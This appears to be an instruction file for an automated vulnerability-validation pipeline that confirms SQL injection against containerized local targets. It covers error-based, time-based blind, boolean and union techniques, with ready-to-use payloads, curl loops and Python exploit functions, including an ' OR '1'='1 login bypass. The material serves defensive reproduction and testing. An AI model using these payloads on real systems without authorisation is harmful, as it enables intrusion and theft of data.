---
name: validate-sql-injection
description: Validate SQL injection vulnerabilities using error-based, time-based blind, boolean-based, and union-based techniques against containerized targets. No external infrastructure required — validation uses HTTP response analysis and response timing.
origin: vuln-analysis
---

# Validator: SQL Injection

Confirm whether a vulnerability allows SQL injection by probing the target's parameterized input with payloads and analyzing HTTP responses.

## When to Activate

- A `sql_injection` vulnerability needs validation during reproduction (Step 7/8)

## No External Infrastructure Required

Unlike RCE and SSRF validators, SQL injection validation requires NO additional infrastructure setup. All evidence is gathered from HTTP responses:
- **Error-based**: SQL error strings appear in response body
- **Time-based**: Response time >= 5× baseline indicates SLEEP/WAITFOR execution
- **Boolean-based**: Structurally different responses for TRUE vs FALSE conditions
- **Union-based**: Injected data appears in response body

## Prerequisites

```bash
# Just verify the target endpoint exists and responds
curl -sf -o /dev/null -w "%{http_code}" http://localhost:<port>/endpoint
# Accept: 200, 400, 401, 403, 500 — any means the endpoint exists
```

## Validation Techniques (try in order)

### Technique 1: Error-Based (fastest — try first)

Inject a single quote or comment into the parameter. If the database surfaces an error in the response, it's confirmed.

```bash
# Example payloads
PAYLOAD="'"
PAYLOAD_URL_ENC="%27"
PAYLOAD2="'--"
PAYLOAD3="' OR '1'='1"

# Test via GET parameter
docker exec <container> curl -sf "http://localhost:<port>/endpoint?id=${PAYLOAD_URL_ENC}"

# Test via POST JSON body
docker exec <container> curl -sf -X POST http://localhost:<port>/endpoint \
  -H 'Content-Type: application/json' \
  -d '{"id": "'"'"'"}'
```

Check response for SQL error signatures:

```bash
RESPONSE=$(docker exec <container> curl -sf "http://localhost:<port>/endpoint?id=%27")
echo "$RESPONSE" | grep -iE \
  "sql syntax|syntax error|mysql_error|pg_query|ORA-[0-9]+|SQLite.*error|MariaDB.*error|ODBC.*error|Microsoft.*ODBC|Unclosed quotation mark|You have an error in your SQL|near.*syntax|unterminated quoted string|quoted string not properly terminated|invalid input syntax for type" \
  && echo "[CONFIRMED] Error-based SQLi" || echo "No error found"
```

**SQL Error Signatures by Database**:

| Database | Error Pattern |
|----------|--------------|
| MySQL / MariaDB | `You have an error in your SQL syntax`, `mysql_error()` |
| PostgreSQL | `syntax error at or near`, `pg_query()`, `invalid input syntax for type` |
| MSSQL | `Unclosed quotation mark`, `Microsoft OLE DB Provider for SQL Server`, `ODBC SQL Server Driver` |
| Oracle | `ORA-[0-9]+`, `quoted string not properly terminated` |
| SQLite | `SQLite.*error`, `near "': syntax error` |
| Generic | `syntax error`, `SQL error`, `database error`, `SQLSTATE` |

### Technique 2: Time-Based Blind (when no error output — 5-second delay)

Inject a time-delay payload. If the server takes >= 5 seconds longer than baseline, SQL code executed.

```bash
# Baseline (3 requests, average)
T1=$(docker exec <container> sh -c 'start=$(date +%s%3N); curl -sf http://localhost:<port>/endpoint?id=1 -o /dev/null; echo $(($(date +%s%3N)-start))')
T2=$(docker exec <container> sh -c 'start=$(date +%s%3N); curl -sf http://localhost:<port>/endpoint?id=1 -o /dev/null; echo $(($(date +%s%3N)-start))')
T3=$(docker exec <container> sh -c 'start=$(date +%s%3N); curl -sf http://localhost:<port>/endpoint?id=1 -o /dev/null; echo $(($(date +%s%3N)-start))')
BASELINE=$(( (T1 + T2 + T3) / 3 ))

# Payloads (try all — different DBs need different syntax)
PAYLOADS=(
  "1'; WAITFOR DELAY '0:0:5'--"     # MSSQL
  "1' AND SLEEP(5)--"               # MySQL
  "1'; SELECT pg_sleep(5)--"        # PostgreSQL
  "1'; SELECT 1 FROM DUAL WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--"  # Oracle
  "1) OR SLEEP(5)--"                # MySQL alternative
  "1 AND SLEEP(5)--"                # MySQL no-quote
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
  ATTACK_TIME=$(docker exec <container> sh -c "start=\$(date +%s%3N); curl -sf 'http://localhost:<port>/endpoint?id=${ENCODED}' -o /dev/null; echo \$(($(date +%s%3N)-start))")
  RATIO=$(( ATTACK_TIME / (BASELINE + 1) ))
  if [ "$RATIO" -ge 4 ]; then
    echo "[CONFIRMED] Time-based SQLi: ${ATTACK_TIME}ms vs baseline ${BASELINE}ms (${RATIO}x)"
    break
  fi
done
```

**Threshold**: Attack response >= 4× baseline (typically >= 4500ms when baseline is ~100ms).

### Technique 3: Boolean-Based (structural response comparison)

Inject TRUE and FALSE conditions. If responses differ structurally, the injection worked.

```bash
# TRUE condition — should return normal data
TRUE_RESP=$(docker exec <container> curl -sf "http://localhost:<port>/endpoint?id=1%20AND%201%3D1--")
TRUE_LEN=${#TRUE_RESP}

# FALSE condition — should return empty or error
FALSE_RESP=$(docker exec <container> curl -sf "http://localhost:<port>/endpoint?id=1%20AND%201%3D2--")
FALSE_LEN=${#FALSE_RESP}

DIFF=$((TRUE_LEN - FALSE_LEN))
if [ "${DIFF#-}" -gt 50 ]; then  # >50 byte difference
  echo "[CONFIRMED] Boolean-based SQLi: TRUE_LEN=${TRUE_LEN} FALSE_LEN=${FALSE_LEN} diff=${DIFF}"
fi
```

### Technique 4: Union-Based (data extraction)

Inject UNION SELECT to extract a known marker value from the database.

```bash
# Find column count first (try 1–5 columns)
for COLS in 1 2 3 4 5; do
  NULLS=$(printf ',NULL%.0s' $(seq 1 $((COLS - 1))))
  PAYLOAD="' UNION SELECT 'SQLI_CONFIRMED'${NULLS}--"
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")
  RESPONSE=$(docker exec <container> curl -sf "http://localhost:<port>/endpoint?id=${ENCODED}")
  if echo "$RESPONSE" | grep -q "SQLI_CONFIRMED"; then
    echo "[CONFIRMED] Union-based SQLi with ${COLS} columns: marker 'SQLI_CONFIRMED' found in response"
    break
  fi
done
```

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | Any ONE technique confirms injection AND legitimacy check passes |
| **[FAILED]** | No technique shows injection within timeout |
| **[INVALID]** | PoC script directly queries the database (bypasses the target app) |

## Legitimacy Check (Anti-Cheat)

Scan the PoC script source code. If ANY of these patterns appear as **direct calls** (not as payload strings embedded in HTTP request data), the result is `[INVALID]`:

```python
# FORBIDDEN — direct database connection bypassing the target app
import psycopg2
conn = psycopg2.connect(...)           # INVALID — direct DB connection

import pymysql
conn = pymysql.connect(...)             # INVALID — direct DB connection

import sqlite3
conn = sqlite3.connect(...)             # INVALID — direct DB connection

# CORRECT — injection through the target app's HTTP interface
requests.get(f"{target}/api/users?id=' OR '1'='1")   # VALID
requests.post(f"{target}/login", json={"username": "admin'--"})  # VALID
```

**Rule**: The PoC must inject SQL via the target app's HTTP interface. Directly connecting to the database is INVALID.

## PoC Patterns

### GET Parameter Injection
```python
def exploit(target, timeout):
    payloads = [
        ("'", "error-based"),
        ("' AND SLEEP(5)--", "time-based"),
        ("' UNION SELECT 'SQLI_CONFIRMED',NULL--", "union-based"),
        ("' AND 1=1--", "boolean-true"),
        ("' AND 1=2--", "boolean-false"),
    ]
    for payload, technique in payloads:
        try:
            start = time.time()
            resp = requests.get(f"{target}/endpoint", params={"id": payload}, timeout=timeout)
            elapsed = time.time() - start
            # Check error-based
            if re.search(r'sql syntax|syntax error|ORA-\d+|pg_query|ODBC', resp.text, re.I):
                return {"technique": technique, "response": resp.text[:500], "elapsed": elapsed}
            # Check time-based
            if elapsed >= 4.5 and "sleep" in payload.lower():
                return {"technique": technique, "elapsed": elapsed}
            # Check union-based
            if "SQLI_CONFIRMED" in resp.text:
                return {"technique": technique, "response": resp.text[:200], "elapsed": elapsed}
        except Exception:
            continue
    return None
```

### POST JSON Body Injection
```python
def exploit(target, timeout):
    import json
    payloads = ["'", "' OR '1'='1'--", "1' AND SLEEP(5)--"]
    for payload in payloads:
        start = time.time()
        resp = requests.post(f"{target}/api/login",
            json={"username": payload, "password": "x"},
            timeout=timeout)
        elapsed = time.time() - start
        if re.search(r'sql syntax|error in your SQL|ORA-\d+|syntax error', resp.text, re.I):
            return {"confirmed": True, "evidence": f"SQL error in response: {resp.text[:300]}"}
        if elapsed >= 4.5 and "SLEEP" in payload:
            return {"confirmed": True, "evidence": f"Time-based: {elapsed:.1f}s"}
    return None
```

## Confidence Scoring (1-10)

| Score | Scenario |
|-------|----------|
| 9-10 | Database error string in response OR time-based delay >= 5× baseline confirmed |
| 7-8 | Boolean-based response difference > 50 bytes with consistent behavior |
| 5-6 | Union-based marker found once (may be coincidence) — re-run to confirm |
| 1-4 | No consistent evidence across multiple attempts |

**Threshold: Only mark [SUCCESS] if Confidence >= 7**

## Output: Write to results.json (MANDATORY)

```json
{
  "vuln_id": "VULN-001",
  "type": "sql_injection",
  "poc_script": "poc_scripts/poc_sql_injection_001.py",
  "status": "SUCCESS",
  "exit_code": 0,
  "retries": 0,
  "entry_point_used": "GET /api/users?id=",
  "validation_result": {
    "marker": "CONFIRMED",
    "evidence": "Error-based SQLi: response contained 'You have an error in your SQL syntax' when payload \"'\" injected into id parameter"
  }
}
```

**Marker values**:
- `"CONFIRMED"` → any technique confirmed injection
- `"NOT_REPRODUCED"` → no technique showed injection within timeout
- `"PARTIAL"` → boolean difference detected but not definitive
- `"ERROR"` → network/infrastructure failure
